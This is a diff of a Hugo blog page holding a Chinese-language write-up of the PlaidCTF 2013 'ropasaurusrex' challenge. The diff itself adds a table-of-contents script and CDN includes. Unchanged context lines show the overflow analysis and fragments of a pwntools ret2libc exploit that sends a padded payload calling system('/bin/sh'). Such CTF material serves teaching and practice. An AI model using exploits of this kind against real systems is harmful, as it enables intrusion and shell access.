@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 	<head>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
+		<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
 		<meta charset="utf-8">
 		<meta http-equiv="X-UA-Compatible" content="IE=edge">
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -28,6 +30,8 @@ from pwn import *elf = ELF(&#39;./ropasaurusrex&#39;)io = process(&#39;./ropas
 		
 		<link rel="apple-touch-icon" href="https://yuuoniy.github.io/apple-touch-icon.png">
 		<link rel="icon" href="https://yuuoniy.github.io/favicon.ico">
+		
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css">
 		<meta name="generator" content="Hugo 0.76.5" />
 		
 		
@@ -47,6 +51,7 @@ from pwn import *elf = ELF(&#39;./ropasaurusrex&#39;)io = process(&#39;./ropas
 				if (time < sunrise || time > sunset)
 					document.body.classList.add('dark');
 			}
+			
 		</script>
 		
 	</head>
@@ -56,6 +61,7 @@ from pwn import *elf = ELF(&#39;./ropasaurusrex&#39;)io = process(&#39;./ropas
 			setTheme();
 			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
 		</script>
+		
 		
 		<header class="header">
 			<nav class="nav">
@@ -81,10 +87,13 @@ from pwn import *elf = ELF(&#39;./ropasaurusrex&#39;)io = process(&#39;./ropas
 
 <article class="post-single">
 	<header class="post-header">
+
 		<h1 class="post-title">PlaidCTF-2013-ropasaurusrex</h1>
 		<div class="post-meta">March 17, 2018</div>
+		
+		
 	</header>
-	<div class="post-content"><p>分析：<br>
+	<div class="toc"></div><div class="post-content"><p>分析：<br>
 buf大小只有0x88,但是却允许被读入0x100的字节大小，造成缓冲区溢出。程序是32位。<br>
 定义函数：ssize_t write (int fd, const void * buf, size_t count);<br>
 函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.</p>
@@ -120,6 +129,82 @@ payload = 'a'*140+p32(sys_addr)+p32(0xdeafbeef)+p32(bin_addr)
 io.send(payload)
 io.interactive()
 </code></pre></div>
+	<script>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		function mashiroToc(mashiro) {
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    if (mashiro) {
+        var id = 1;
+        $(".post-content").children("h1,h2,h3,h4,h5").each(function() {
+            
+            var hyphenated = "mm-" + id;
+            $(this).attr('id', hyphenated);
+            id++;
+        });
+        
+        tocbot.init({
+            tocSelector: '.toc',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            positionFixedSelector: ".toc",
+            scrollEndCallback: function (e) {
+                window.scrollTo(window.scrollX, window.scrollY - 80);
+            },
+        });
+    }
+}
+	mashiroToc(true);
+	</script>
 	
 </article></main>
 <footer class="footer">
@@ -136,4 +221,3 @@ io.interactive()
 </script>
 </body>
 </html>
-
